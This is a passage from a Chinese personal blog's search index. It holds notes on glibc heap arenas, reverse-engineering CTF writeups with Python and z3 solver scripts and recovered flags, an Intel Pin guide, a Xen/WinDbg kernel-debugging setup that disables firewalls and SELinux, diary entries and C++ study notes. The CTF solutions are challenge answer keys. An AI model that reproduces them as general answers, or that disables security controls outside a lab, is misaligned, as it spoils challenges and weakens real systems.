arena是brk创建出来的）。同样的，用户请求了1000字节的大小，1MB的空间被创建，同时只有132KB的大小空间被设置成读写，并且变成了该线程的heap地址空间，这段连续的区域被叫做这个线程的arena。   注意，当请求的空间过大时，并且没有足够的空间来满足用户的请求，无论是main arena还是thread arena都使用mmap系统调用，而不是brk来分配内存。   在thread1进行free之后，释放已经分配的内存并不会将heap的内存归还给操作系统。   ","categories": [],
        "tags": ["pwn","heap"],
        "url": "https://zjgcjy.github.io/posts/2019-03/malloc%E5%86%85%E9%83%A8%E5%AE%9E%E7%8E%B0.html",
        "teaser":null},{
        "title": "Iie 2019 4 Bluectf",
        "excerpt":"   UCAS-IIE-2019-4-BlueBCTF writeup      babybaseX      考点         C++     STL：vector     编码转换      main   先来看一下主函数的逻辑。         发现主要是encode进行了操作，跟进去。   encode   主要逻辑是一个双层大循环，对输入进行编码然后输出。   关于最开始一段代码，是用来分配空间的。   len = ((((0xA3D70A3D70A3D70BLL * (138 * (end - p))) &gt;&gt; 64) + 138 * (end - p)) &gt;&gt; 6) - (138 * (end - p) &gt;&gt; 63) + 1;   参考链接Hacker’s-Delight     得到前面一部分是0.01，乘以138，等于1.38。考虑到没计算后面2部分，这里可以近似等于1.333循环，所以我猜测该段代码实际作用如下。     所以根据最后cipher的长度是22，可以得到给plain分配的空间是15左右。   核心编码过程         d&lt;&lt;8|n   d  r 0031    01 17 0001    00 01  1732    e4 0a 01e4    12 10 0012    00 12  0a33    64 0b 1064    a1 0a 12a1    b7 0b 00b7    07 01 0007    00 07   编写脚本   编码脚本：   #coding:utf-8 __author__ = 'zjgcjy' import math table = 'vrYenHCzNgu7FRTDbLiqtBpQZoUS3f5dKWsaM8Gm1EyVJkjw4cA6X92Pxh0OLl+/' plain = 'NowYouKnowBa5358' length = int(math.floor(len(plain) * 4.0/3 + 1 )) mod = ord(plain[1]) - ord(plain[0]) + 25  r0 = r_next = [0] for i in xrange(len(plain)):     d = ord(plain[i])     j = 0     r_next = []     while d or j &lt; len(r0):         if j &gt;= len(r0):             r0.append(0)         d = r0[j] &lt;&lt; 8 | d         rr = d % mod         r_next.append(rr)         d = d / mod         j += 1     #print r_next     r0 = r_next if not len(r0) &gt; length:     print r0 else:     print 'error' cipher = ''.join([table[i] for i in r0]) print cipher[::-1]   解码脚本：   #coding:utf-8 __author__ = 'zjgcjy' table = 'vrYenHCzNgu7FRTDbLiqtBpQZoUS3f5dKWsaM8Gm1EyVJkjw4cA6X92Pxh0OLl+/' cipher = 'gmJNxnNCPChRefqDYSU1KZ' r0 = r = [table.index(i) for i in cipher]  filterF = lambda x: filter(lambda y: y &gt; 128, x)  for mod in xrange(256):     r = r0     flag = ''     for _ in xrange(len(r)):         d = [0]         r_prev = []         for i in xrange(len(r)):             n = d[i] * mod + r[i]             d.append(n &amp; 0xff)             r_prev.append(n &gt;&gt; 8)         flag += chr(d[-1])         r = r_prev[1:]     if filterF(map(ord, flag)) != []:         continue     print hex(mod), flag  if __name__ == '__main__':     print '8535aBwonKuoYwoN'[::-1]    babyre      考点         SEH     MISC     一元一次方程求解      main      一个伪造的fake flag。      产生除0异常。      SEH处理   编译器对系统SEH机制的封装      对于VC的SEH，其每个异常帧的CALL_BACK都统一设为_except_handler4。每进入一个try块里，编译器会将VC_EXCEPTION_REGISTRATION中tryLevel赋值为相应的值。 一旦该try块异常发生，系统会先从VC_EXCEPTION_REGISTRATION的handler域中找到_exception_handler4函数（C运行时库函数），然后根据当前tryLevel的值找到scopetable表中这个__try块相应的过滤函数和处理函数对异常进行相应的处理。                  Enum       value       explanation                       EXCEPTION_EXECUTE_HANDLER       1       处理异常，从异常处下一条指令继续执行                 EXCEPTION_CONTINUE_SERCH       0       不处理异常，继续搜索执行下一个EH                 EXCEPTION_CONTINUE_EXECUTION       -1       忽略异常，从异常处继续执行              BOOL __cdecl check11(char *a1) {   return (a1[4] + a1[2] + *a1) == 253       &amp;&amp; (a1[7] + a1[5] + a1[3] + a1[1]) == 140       &amp;&amp; *a1 == (a1[1] + 1)       &amp;&amp; a1[1] == (a1[2] + 50)       &amp;&amp; a1[2] == (a1[3] - 47)       &amp;&amp; a1[6] == (a1[4] - 49)       &amp;&amp; a1[6] == (a1[7] - 49)       &amp;&amp; a1[5] == (a1[3] - 1); }   使用z3进行约束求解。   #coding:utf-8 __author__ = 'zjgcjy' from z3 import *  a1 = [BitVec('a1[%d]'%i, 8) for i in xrange(8)] s = Solver()  s.add(And( \t((a1[4] + a1[2] + a1[0]) &amp; 0xff == 253), \t((a1[7] + a1[5] + a1[3] + a1[1]) &amp; 0xff == 140), \t(a1[0] == a1[1] + 1), \t(a1[1] == a1[2] + 50), \t(a1[2] == a1[3] - 47), \t(a1[6] == a1[4] - 49), \t(a1[6] == a1[7] - 49), \t(a1[5] == a1[3] - 1),     ))  for i in xrange(len(a1)):     s.add(ULE(a1[i], 0x7f))     s.add(UGE(a1[i], 0x20))  if s.check() == sat:     m = s.model()     flag = ''     for i in xrange(8):         flag += chr(m[a1[i]].as_long().real)     print flag else: \tprint 'no'   得到结果是fe3bda3d。   进行第二部分的检查。      解决   最后的脚本如下。   #coding:utf-8 __author__ = 'zjgcjy' plain = 'fe3bda3d' * 3 cipher = '04 09 46 07 1F 03 52 06 1F 3A 41 51 3B 50 40 3B 55 04 40 1B 3B 09 5B 19'.replace(' ', '').decode('hex')  xorF = lambda a, b: map(lambda x, y: x ^ y, a, b)  flag = xorF(map(ord, plain), map(ord, cipher)) print ''.join(map(chr, flag))   Thanks  ","categories": [],
        "tags": ["writeup"],
        "url": "https://zjgcjy.github.io/posts/2019-04/IIE-2019-4-BlueCTF.html",
        "teaser":null},{
        "title": "Pintools使用",
        "excerpt":"   Pintools 使用手册      参考文档   Intel PinTools 安装使用教程   pintool的搭建和使用示例   Intel Pin基础   下载解压   wget https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.7-97619-g0d0c92f4f-gcc-linux.tar.gz tar -xzf pin-3.7-97619-g0d0c92f4f-gcc-linux.tar.gz   测试（失败）   我们可以 先运行一个 demo 进行测试。在这个例子中我们将生成一个名为 insmix 的工具，这个工具是用来统计应用程序执行的 x86 指令的数量的。通过如下指令打开 insmix 工具所在目录，并生成该工具：   cd pin-3.7-97619-g0d0c92f4f-gcc-linux/source/tools/Insmix make   如果执行成功的话，应该可以在 source/tools/Insmix/obj-intel64/ 目录下找到文件insmix.so。此时我们返回到 pin 的根目录，然后输入如下指令将 insmix 工具附加在 ls 指令上并由 pin 运行 ls 指令：   cd ../../../ ./pin.sh -t source/tools/Insmix/obj-intel64/insmix.so -- ls   运行结束后结果文件输出在 pin 根目录下，即 insmix.out。   这一段是网上的教程，我这里测试失败了，不知道为什么，编译不能通过。   官方测试文档   pintool_docs   不翻译了，都能看懂。   To build all examples in a directory for ia32 architecture: $ cd source/tools/ManualExamples $ make all TARGET=ia32  To build all examples in a directory for intel64 architecture: $ cd source/tools/ManualExamples $ make all TARGET=intel64  To build and run a specific example (e.g., inscount0): $ cd source/tools/ManualExamples $ make inscount0.test TARGET=intel64  To build a specific example without running it (e.g., inscount0): $ cd source/tools/ManualExamples $ make obj-intel64/inscount0.so TARGET=intel64  The above applies to the Intel(R) 64 architecture. For the IA-32 architecture, use TARGET=ia32 instead. $ cd source/tools/ManualExamples $ make obj-ia32/inscount0.so TARGET=ia32   示例   统计指令长度   $ ../../../pin -t obj-intel64/inscount0.so -- /bin/ls Makefile          atrace.o     imageload.out  itrace      proccount Makefile.example  imageload    inscount0      itrace.o    proccount.o atrace            imageload.o  inscount0.o    itrace.out $ cat inscount.out Count 422838   自定义输出文件   $ ../../../pin -t obj-intel64/inscount0.so -o inscount0.log -- /bin/ls   ","categories": [],
        "tags": ["pintools"],
        "url": "https://zjgcjy.github.io/posts/2019-04/pintools%E4%BD%BF%E7%94%A8.html",
        "teaser":null},{
        "title": "五月日记",
        "excerpt":"   每日所作所得      5月1日   5月2日   5月3日   5月4日   5月5日   5月6日   开始肝毕设。   ","categories": [],
        "tags": ["日记"],
        "url": "https://zjgcjy.github.io/posts/2019-05/%E4%BA%94%E6%9C%88%E6%97%A5%E8%AE%B0.html",
        "teaser":null},{
        "title": "Iie 2019 5 Yellowctf",
        "excerpt":"   UCAS-IIE-2019-5-Yellow-YCTF writeup      re1      考点         rot13     base32     strcmp_asm      main   首先查看main函数，结果如下。         包含输入长度判断和两段strcmp汇编形式的判断，其中第一段是不相等，第二段是相等。第一段前进行了rot13（offset=14）编码，两段中间进行了init操作，以及一个关键的check函数。   rot13（offset=14）   其中的rot13如下所示，算一下偏移能发现是14。      init   初始化列表init函数将字符串进行动态修改，逻辑如下，比较简单，最后得到的table是NoPqRsTuVwXyZaBcDeFgHiJkLm567234      base32   然后进行关键的base32操作，算法比较明显，和base64差不多，32是2的5次方，8bit乘以5即40bit一组。      求解   分别列出rot13和base32算法即可。      最后得到 Y@u_Kn@W_b@s332_@Nd_r0t13   float      考点         方程     float乘以2     整数和小数分开处理     动态调试      main   首先查看main函数，定义了一堆奇怪变量。然后对输入进行简单检查，满足一个float形式，且大于0，小于10。小数部分长度是7。      在输入之后，开始检查，首先判断是不是小数，然后进入关键的check函数，之后和cipher进行对比。最后进行关键的check2判断。      check1函数将在下面进行详细说明，首先讨论memcmp和check2的部分。这里memcmp的部分就是对check1的结果和cipher进行对比，对比的值就是一开始定义的常量，只不过逐比特逐比特对比。(((1 &lt;&lt; (v10 &amp; 0x1F)) &amp; *((_DWORD *)v19 + (v10 &gt;&gt; 5))) != 0) == v23[v10] 脚本如下。   c = '''00 01 00 00 00 00 00 00 01 00 01 00 00 00 01 01 \\ 00 00 01 01 00 00 01 01 00 00 01 01 00 00 01 01'''.split() c = map(lambda x: x[1:], c) cipher = '' for i in xrange(len(c)/8):     t = eval('0b' + ''.join(c[8*i:8*(i+1)][::-1]))     cipher += hex(t)[2:].rjust(2, '0') print cipher   得到02c5cccc，也就是0xccccc502所以check1函数对输入进行处理后，返回的结果是这个值。如果满足进行check2，就是一个方程，估计是输入值不止一个，所以这里加了一个条件判断（最后发现是精度检查）。   check1   在check1函数中，主要分为2个部分，分别对输入的整数部分和小数部分进行处理，两个部分对后续的值都有影响。由于大量代码在float格式下存在优化的问题，导致静态逆向存在很大的困难，所以在解题的时候，我主要采用动态调试的方式。这里分为几个部分说明。 首先是输入参数，将输入值加上1.234567传入check1函数中。   小数部分   sub_EF12C0这个函数的作用是对小数部分进行处理，主要使用sse指令进行处理，创建两个结构体，都是用于分配的空间地址。      这里同时也用到了ffloor函数用于判断输入的整数部分。这里先不讨论整数部分值的情况。大致的算法就是对小数部分进行模拟逼近，从0.5开始逼近，小于则置1，否则置0，然后是0.25，0.125等等。这部分比较好逆向，模拟算法如下，可将小数转换成十六进制（f2h）。      在逼近结束后，只会产生3个hex值，最后一个hex值和第二个hex值的部分位，将由整数部分输出。   整数部分   在逆向的过程中，发现整数部分用于判断和2的次方的大小关系，也影响了小数部分的输出值。在sub_EF1200函数中对整数部分进行了检测并返回相应的值，由于输入值在0-9之间，这里我也没详细看，大概判断出是不断乘以2的操作。之间用idapython遍历一下就行。   idapython   这里就用idapython配合ida，hook自带的dbg，然后动态下断和获取就行了 ，脚本不上了。就9个值，看下结果就行。      可以看到，和上文所说一致，第一列是输入值，第二列是输入check1的参数，第三列是小数部分的值，第四部分是最后的输出值。 整数部分主要影响第一个hex的值，从0到9只有fc、02、82三个值，最后的cipher第一个hex是02，可判断大致的输入范围。 由f2h函数可知，第三列的结果符合模拟算法的结果，而第四列的结果是小数部分的值乘以2。当整数部分的值扩大，每当大于2的次方时，小数部分的值又会乘以2，大致关系就是这样。   求解   虽然能大致得到整数部分的范围，但是其中有个4，所以这里需要分类讨论。将cipher的值去掉最后一个hex，同时去掉一位整数部分的影响，得到0xccccc4      如果值大于4，小数部分的值应该是0xccccc4除以8。   如果值小于4，小数部分的值应该是0xccccc4除以4。   也就是0x199998和0x333331。然后写出f2h的逆算法，h2f如下所示。最后对两种情况分别验证即可。      最后得到1.3154329，输入之后发现不满足check2。一开始以为是哪里弄错了，最后发现是精度不对，改成1.3154328就行了。  ","categories": [],
        "tags": ["writeup"],
        "url": "https://zjgcjy.github.io/posts/2019-05/IIE-2019-5-YellowCTF.html",
        "teaser":null},{
        "title": "xen",
        "excerpt":"   详细记录对基于Xen虚拟化的Windows系统双机内核调试的配置步骤      基本原理   大致的流程是：虚拟串口——TCP——虚拟串口   使用windbg的串口调试功能。由于调试主机没有串口，采用创建虚拟串口的方式，使用sockpipe工具，创建管道，如此windbg能顺利接上这个管道，并将管道映射到本机的一个端口上，供目标主机链接。然后在目标主机上设置相应的参数，在虚拟机上也创建一个虚拟串口，同时通过TCP链接到调试主机的端口上，创建整条调试通路。最后只要设置虚拟机的调试参数就可以了。   下面讲详细对依赖环境及工具进行说明。   调试主机（OS：Windows 10）      关闭防火墙，允许ICMP和TCP报文通过，开放端口   关闭可能造成网络不稳定影响的安全软件   安装windbg，最好安装WDK/SDK，并配置符号路径   安装Xen开发人员的sockpipe工具   使用sockpipe创建一个管道，指定管道名称和映射的端口号。   sockpipe.exe &lt;pipename&gt; &lt;port&gt;      这样调试线路的一端就可以了，打开windbg，设置串口调试并指定管道名称和波特率（波特率必须和下文中的波特率匹配）并等待虚拟机连上即可。      目标主机（OS：基于Xen的Ubuntu18）      关闭防火墙，配置iptables，允许ICMP和TCP报文通过，开放端口   关闭selinux，防止干扰   设置虚拟机的配置文件，最重要的是serial的值。   serial=['tcp:&lt;ip&gt;:&lt;port&gt;, nodelay']   其中的ip是调试主机的ip，端口号对应了sockpipe创建的端口号，同时指定参数是nodelay。      同时配合netstat和top等命令查看是否连接上对应的ip地址，否则虚拟机将无法启动。   被调试虚拟机（OS：Windows 7 x86 sp0）      关闭防火墙，允许ICMP和TCP报文通过，开放端口   关闭可能造成网络不稳定影响的安全软件   如果上文配置正确，正常启动虚拟机，将在设备管理器中看见新添加的一个串口。      这时再通过msconfig配置虚拟机，创建一个新的启动项，同时设置成调试模式，指定串口对应的端口号和波特率。      之后再通过bcdedit查看创建是否成功。特别是调试类型、端口和可调试选项，如下图所示。      然后重新启动虚拟机，并选择调试模式进入。此时windbg将在Windows启动界面回显，sockpipe也会有回显。      参考资料   Windows-HVM-Debugging how-to-capture-memory-dump-of-windows DEBUGGING WINDOWS GUESTS ON XENSERVER kernel-debugging-qemu-windbg xen配置手册 XEN下两台VM调试 微软如何设置内核模式调试 windows内核调试配置 How to use windbg to debug XEN windows XP domainU under Suse kernel-debugging-a-windows-guest-system-from-a-linux-system-setup-not-working Debugging Windows Kernel from Linux windows-kernel-debugging-on-mac-host-using-vmware-fusion    ","categories": [],
        "tags": ["xen","windbg"],
        "url": "https://zjgcjy.github.io/posts/2019-07/%E5%9F%BA%E4%BA%8EXen%E7%9A%84Windows%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE.html",
        "teaser":null},{
        "title": "七月日记",
        "excerpt":"   每日所作所得      7月1日-7月17日   毕业。   7月18日   回所。   7月19日   回所第一天，黄老师好像很忙，没找到他。 和黄老师聊了，分配的任务是继续搭环境以及要帮学姐写poc，汗。   7月20日   上午打比赛，做了安卓，遇到一点智障问题。 下午继续打比赛，ak了，一个是vm，好久没做vm了，还好这个题简单。第二个是ptrace的题，对ptrace的机制不熟悉，但是顺便也复习了ptrace的使用。   7月21日   上午没啥事情，看了ctftime上的比赛，打了一下cybrics的题目，查阅RISC的相关的知识，做了一个逆向。 下午继续做了一个逆向，还是挺复杂的，自己太菜了，做的太慢了。 晚上就回去休息了。   7月22日   上午开了会，说明了工作。接下来继续搭环境。 下午试了socat形式的，不行。可能和防火墙有关。具体原因不明。 之后修改serial，串口终于能映射进去了。后来从管道出发，试了pipe，也不行。 最后尝试根据qemu手册通过tcp来模拟serial，依旧不行。 晚上又试了socket，卡在启动界面，不知道为什么会一直卡住，讲道理应该可以。   7月23日   继续搞环境。考虑到昨天两台虚拟机都不行，今天还是弄物理机调试虚拟机。查到了hw的仿真软件，可以创建虚拟串口，通过ip和port连上虚拟机，同时要将ip和port映射到虚拟机内部，同样作为虚拟串口。理论可行，实际操作多次，多次切换参数均失败，这种方式应该也是没问题的。 有xen不支持的，有启动不起来的，有开始界面卡住的。 晚上和学姐讨论了到现在位置的各种情况，交换了意见，学姐提出不使用kdnet进行网络调试，并找到了sockpipe源码，我开始进行编译。   7月24日   开始调研学姐说的在win7以下版本的网络调试是否可行。最后发现好像都不支持。 然后上午继续编译那个项目，准备试一下pipe的方法，但是出现很多问题，在慢慢修复中。 中午将sockpipe修复成功，然后开始尝试这种方式。 依旧不行，sockpipe显示管道已经搭建成功，但是一直只有debugger sent RESET这句话，也是服了。 终于可以了，我真是醉了，加上nodelay的参数，windbg能顺利连上管道。舒服了，终于成功了，哈哈哈哈。之后和学姐详细讨论了，然后准备把整个配置过程都详细记录下来。 晚上整理了整个过程，所以整个搭建过程自己还是受益匪浅的。   7月25日   自己这边的系统已经完成了，但是学姐那边有问题，上午帮学姐排查了下错误，最后发现是虚拟网桥的问题，这里自己不是很擅长，直接让学姐参照我这边的配置文件自己处理了（汗）。 然后自己开始看书，准备啃掉C++ prime plus以及反汇编和逆向分析这两本书，这里立一个flag吧，准备开学前能基本看完，一些特别复杂的可以稍微延迟一点，希望自己努力。 上午看了C++ prime plus的前两章，这两章都是基础概念，所以比较好过，有些没碰到的东西都记录下来了。 下午继续在看书，然后修改了调试的波特率，发现波特率越大反而没效果，服了。 晚上回去交电费就先走了，然后继续看书，回顾变量的类型和特征。   7月26日   今天是周五，上午还是继续看书，把浮点数和数组那部分看完吧。 下午同样也是继续看书，然后做笔记，争取晚上把符合类型那一章看完。下午同时在研究vscode的配置环境，准备弄一下。主要是python和c++的环境。python是由于不知道什么问题，导致本机安装py3会和ida产生冲突，就很难受。   7月27日   一直在配置vscode的环境，主要是WSL的目录环境和Windows的默认环境冲突，导致gdb调试的时候老师找不到目录和程序，最后的解决办法是找到了网上给的配置文件。最后编译和运行都可以了，但是不支持彩色模式，所以gdb起来之后，看着很难受。 下午还是继续弄环境，把MSVC也弄好了，然后开始看书。之后把指针之前的内容都整理好了。 晚上也是继续在看书，重点是指针部分，后面的循环部分稍微简单点。明天计划把循环和条件判断两章都结束。   7月28日   早上起来跑了步，打了会篮球，然后计划上午继续看书，抓紧吧。 下午继续看书，把复合类型那一章都看完了。 晚上也是继续看书，把循环那一章过了一下，难度不大。留几个难的明天看吧。   7月29日   上午继续看书，后来开了组会，谈了之前环境的问题。终于帮学姐解决了难题，然后黄老师让我继续帮学姐看看poc的什么问题。 下午也是继续看书，把前面6章基本弄完了，不过还留着一个尾巴，就是输入的问题。 晚上发现又有外国人找我，惊了。开始看函数的部分。   7月30日   继续看书。上午也是继续在看函数的部分，下午准备把函数结束。 函数部分基本也看完了，还差函数模板和函数指针，晚上整理白天看的东西。 东西基本整理完了，明天看非OOP部分最难的函数指针、重载和模板。   7月31日   今天开始看函数指针，感冒了，头很晕。 上午效率很低，头晕。 下午也是，睡了很久。 晚上也很早回去了。状态太差了。   ","categories": [],
        "tags": ["日记"],
        "url": "https://zjgcjy.github.io/posts/2019-07/%E4%B8%83%E6%9C%88%E6%97%A5%E8%AE%B0.html",
        "teaser":null},{
        "title": "Cpp_prime_plus_learning1",
        "excerpt":"   C++ Prime Plus 读书笔记1 第1章到第3章 包括一些预备知识和基本数据类型和代码格式      C++简介   C++继承了C语言的优点，同时新添加了内容，包括面向对象编程（OOP）和泛型编程。   关于C语言的编程原理，有这么几点。最开始是过程性语言，强调数据和算法，但是这种方式阅读起来很困难，修改也很复杂。所以逐渐发展成为结构化编程的方法，将分支限制为小组行为中的结构。另一个原则是自顶向下的原则，将大任务分解成小任务，然后各个击破。总体来看，结构化编程反应了过程性编程的思想，即通过执行的操作来构思一个程序。   在OOP提出来后，这种思维强调的是数据，试图让语言来满足问题的要求，是设计与问题的本质相关的数据格式。然后设计出相应的类来表示这些数据格式，同时设置相应的方法，对数据进行操作，从低级数据操作高级数据，是一种自下向上的编程方法。OOP还有助于复用代码和信息隐藏，多态和继承能派生出新类和新的方法。   泛型编程是C++支持的另一种编程模式，它强调的是独立于数据格式的任务，即模板类。   创建C++文件   如何让C++文件运行起来主要分三步，第一步是编写源代码，第二步是编译源代码，生成的代码是目标代码，也就是机器语言。但是这个时候文件还不能运行，还要进行链接，链接的过程就是将程序运行需要的库函数和标准启动函数组合起来，形成可执行代码。   为了支持某些新特性，有些编译器，比如g++编译源代码的命令：   g++ -std=c++0x use_auto.cpp   常见的C++文件拓展名如下表所示。                  C++实现       拓展名                       UNIX       C cc cxx  c                 GNU  C++       C cc cxx cpp c++                 Visual C++       cpp cxx cc           第一章的内容其实没什么重要的东西，了解一下就行了。下面是第二章的内容。   C++语句   C++支持命名空间的用法，这种技术旨在编写大型程序时能将多个同名函数进行区分，有助于组织结构。   using namespace std; 如果只需要使用其中几个对象，可以直接这样写，上面的写法有点偷懒了。 using std::cout; using std::cin; using std::endl; 也可以直接不使用命名空间。 std::cout; std::cin; std::endl;   关于换行符，endl和转义字符不一样的一点在于，endl会确保程序继续运行前刷新输出缓冲区，而转义字符‘\\n’则不一定，有时候不会输出，需要设置输出缓冲区的刷新模式。   C++中的类指定了对象执行的所有操作。对特定对象执行这些操作，需要给对象发送消息，一般分为两种方法，第一种是使用类的方法，第二种是使用运算符重载。   函数   在使用库函数的时候，如果找不到对应的函数，需要手动设置，如下所示。   UNIX CC sqrt.C -lm Linux g++ sqrt.C -lm   数据   使用sizeof运算符可以求类型或者变量的长度。   //可以查看变量的范围 #include&lt;climits&gt;   C++特有的初始化语法，通过新添加的大括号初始化器，初始化常规变量的形式和类变量的形式更像。   int p(80);   关于无符号和有符号数据的范围，C++不保证符号整数的上溢和下溢。   关于数据格式，如果使用标准输入输出流，以不同格式输出的方法如下。   int a(10); // 10进制 cout &lt;&lt; dec; cout &lt;&lt; a; // 16进制 cout &lt;&lt; hex; cout &lt;&lt; a; //8进制 cout &lt;&lt; oct; cout &lt;&lt; a;   整形数据格式与类型   在整数后加l或L表示是long常量，u或U是unsigned int常量，ul或uL表示unsigned long常量，uLL表示unsigned long long常量。   对于不带后缀的十进制数，使用int，long 或者long long类型。 对于不带后缀的十六进制，使用int，unsigned int，long，unsigned long，long long，unsigned long long。 这是因为十六进制经常用来表示内存地址，而地址是非负的，无符号的。   cout对象有成员函数put，用来显示一个字符。 C++中字符用单引号，字符串用双引号。   关于转义字符，问号是需要转义的（参见三字母词）。   C++中表示Unicode编码使用\\u或者\\U前缀，\\uabcd或者\\Uabcdef12，这种数据对应11标准中的char16_t和char32_t。   char16_t ch1 = u'q'; char32_t ch2 = U'\\U0000222B';   还有一种宽字符类型是wchar_t，这是一种拓展集合，使用2个字节。 由于cin和cout只适合处理char类型，对于wchar_t类型，使用iostream头文件中的wcin和wcout。   wchar_t bob = L'P'; wcout &lt;&lt; bob &lt;&lt; L\"tall\" &lt;&lt; endl;   浮点数格式   浮点数的表示格式就两种，第一种是常规方法，第二种是E表示法。浮点类型主要有float，double和long double三种，这是根据有效位数和指数的最小范围来划分的。通常float有32位，double有64位，long double是128位，可以从cfloat或float.h文件中查看范围限制。   浮点变量默认是double类型，后缀F表示float类型，L表示long double类型。   在C++中，float类型只能表示数据中的前6位有效，double是13位有效。   运算符   求模运算符满足以下规则   (a/b)*b + a%b = a   关于类型转换，在使用初始化列表的时候，类型只能向低精度类型转换，否则编译将不能通过。   const int code = 66; int x = 66; char c1 = {66};//可以 char c2 = {1234};//不可以 char c3 = {code};//可以 char c4 = {x};//不可以   在表达式中，如果不存在浮点数，则所有的变量都会进行整形提升，即转换成int，然后进行计算，最后再转换成对应的原始数据类型。   在C++中强制类型转换类似于函数调用。   (long)var  //C long(var)  //C++   C++引入了新的类型转换函数，static_cast用于将数值类型转换成另一种数值类型。   static_cast&lt;typeName&gt; (value)   C++11中引入了新的变量类型，auto，能根据初始化的数据自动判断变量。   ","categories": [],
        "tags": ["C++"],
        "url": "https://zjgcjy.github.io/posts/2019-07/CPP_Prime_Plus_Learning1.html",
        "teaser":null},{
        "title": "Cpp Prime Plus Learning2",
        "excerpt":"   C++ Prime Plus 读书笔记2 第4章到第6章 包括复杂数据格式，循环以及条件结构      数组   sizeof返回的是对象的大小。使用sizeof(array)/sizeof(int)可以求数组大小。可以使用初始化列表对变量进行初始化，不设置的元素默认值是0。 当然STL提供的vectror和C++11提供的Array更好用。   字符串   字符串主要通过字符数组或者string类进行存储。字符数组以空字符结尾，所以长度比设置的长度小1。 直接使用双引号对字符数组进行初始化的字符串称为字符串常量。需要注意的是：字符串这个整体表示的是字符串的所在地址   char a = 's'; //字符 char a[] = \"s\"; //字符串   字符串输入的问题   用到了cin对象的2个方法，getline和get。都是读取一行，但是getline会丢弃换行符，get将保留换行符。getline的方法是cin.getline(array, len)，而get因为保留换行符，所以第二次输入会有换行符，这里需要处理。通常的方法是cin.get(array, len).get()因为get返回的还是一个cin对象。getline也是一样，可以通过连续调用来接受2个数组cin.getline(array1, len1).getline(array2, len2)。   用get对程序的输入更方便处理，而getline则使用更简单。关于读取空行的读取过多的数据，getline和get的情况不太同。 空行：getline读取换行符给目标数组。 空行：get读取设置失效位，后续读取将关闭，需要通过cin.clear()开启 过长：getline保留输入序列，设置失效位，关闭输入 过长：get也保留输入序列，下一次继续读取。   string类   使用初始化列表进行初始化。string p{\"fsdfsd\"} 对于string类来说，如果需要读取一行，使用istream的类方法，即getline(cin, str)   //各种变量初始化方法 char p[]{\"sdfsdfsdf\"}; string aa{\"dfsdf\"}; wchar_t a[]{L\"aerwere\"}; char16_t b[]{u\"basdfsd\"}; char32_t c[]{U\"cwgwe\"};   关于原始字符串，这种字符串中不考虑转义字符的问题。用R前缀和小括号来表示，如果需要表示括号，可以自定义标识符，R可以和u、L等一起使用。   // 使用*+*记号来标记 char dfsfdd[]{R\"*+*(\"(Who wouldn't?)\")*+*\"}; cout&lt;&lt;R\"*+*(\"(Who wouldn't?)\", she whispered.\\n)*+*\"&lt;&lt;endl;   结构体   struct  helloworld {     char  name[10];     int   index;     double grade; }aaa, *pp;    //直接申明变量  helloworld x{\"dfdsfd\",6,9.9};  //申明变量  struct    //匿名结构体 {     char  name[20];     int index; }*ppp;   结构体允许直接进行成员赋值，应该是设置了对应的复制构造函数。   关于结构体数组的初始化方法如下:   struct mystruct {     char name[10];     int index;     double grade; }guests[2]{     {\"chen\", 1, 95.5},     {\"dong\", 2, 2.6}, };   结构体中的位字段这个结构说明的比较少，C++允许指定占用特有位数的结构成员，字段的类型为整形或枚举，然后是冒号，后面是数字指定了占用的位数。可以使用没有名称的字段来提供占位符。每个成员被称为位字段。   struct {     unsigned int SN : 4;     unsigned int : 4; //占位符     bool good1 : 1;     bool good2 : 1; }tr{14,true,false};   共用体   共用体的长度是最大成员的长度。 通常设置匿名共用体，结合结构体来表示一些特殊数据。   struct widget {     char baudrate[10];     int type;     union {    // 匿名共用体，可以通过test.id_num直接访问对应的变量         long id_num;         char id[20];     }; } test;   枚举   枚举的关键词是enum，这能创建符号常量。 枚举值能参与算术运算，但所有的值会进行整形提升，转换成int值，且不能给enum赋值，但可以通过强制类型转换进行赋值。   enum    //匿名枚举变量 {     red = 1,     orange = 5,     green = 8,     blue = 200,     indigo = 200,     puple = 201,     black = 300 }test; //可以不指定变量，即只创建符号常量，相当于const   通过强制类型转换，可以将任意值赋值给枚举变量，但是是有范围的，枚举的取值范围取决于已经初始化的值的范围，最大值是大于当前最大值的最小的2的次方减1。最小值如果初始化的值都非负，则是0，否则是小于当前最小值的最小的2的次方加1。   指针   int* p = (int*)0x12345678;//强制指向特定地址   数组名等价于数组的首地址。指针可以加减，但是数组名不行。 关于数组的地址，表述如下数组名表示的是一个元素占内存的地址，数组取地址表示的是整个数组占内存块的大小。所以p是一个整形的指针，而&amp;p是这样这个指针，即指向一个包含n个元素的int数组。   int p[] = {1, 2, 3, 4, 5, 6}; cout &lt;&lt; p &lt;&lt; endl;//和&amp;p[0]等价，表示第一个元素的地址 cout &lt;&lt; &amp;p &lt;&lt; endl;//整个数组的地址 cout &lt;&lt; p +  1  &lt;&lt; endl;//下一个元素 cout &lt;&lt;  &amp;p +  1  &lt;&lt; endl;//数组结束地址   int(*pp)[6] =  &amp;p;//创建一个指向6个int元素的指针 cout &lt;&lt; pp &lt;&lt; endl;//整个数组大小，和&amp;p等价 cout &lt;&lt;  *pp &lt;&lt; endl;//整个数组中第一个元素的地址。和p以及&amp;p[0]等价 cout &lt;&lt;  **pp &lt;&lt; endl;//第一个元素 cout &lt;&lt; (*pp) +  1  &lt;&lt; endl;//第二个元素的地址，和&amp;p[1]等价 cout &lt;&lt;  *((*pp) +  1) &lt;&lt; endl;//第二个元素的值   上面这几行反汇编的结果如下所示。伪代码很奇怪。      直接上汇编代码。      直接看汇编的话就会发现，前面2个是一样的。即pp和&amp;pp，在实现是一样的。第三个多了一行mov指令，mov     eax, [rax]所以是第一个元素。第四个多了一行add     rax, 4，所以是取第二个元素的地址。第五个则是多了上面两行，所以是第二个元素。   类型组合   主要是指针数组比较难理解。指针数组是数组，每一个成员都是指针，可以创建一个二级指针指向该数组可以采用auto类型自动判断类型。   // 结构体数组 helloworld p1[]{s1, s2, s3}; // 结构体数组访问方式 p1[0].year; (*(p1 + 1)).year;  // 指针数组，指向结构体的指针 helloworld *p2[]{&amp;s1, &amp;s2, &amp;s3}; //指针数组访问方式 p2[0]-&gt;year; (*(p2 + 1))-&gt;year; (**(p2 + 1)).year;  //二级指针，指向指针数组 auto p3{p2}; //二级指针访问方式 (*p3 + 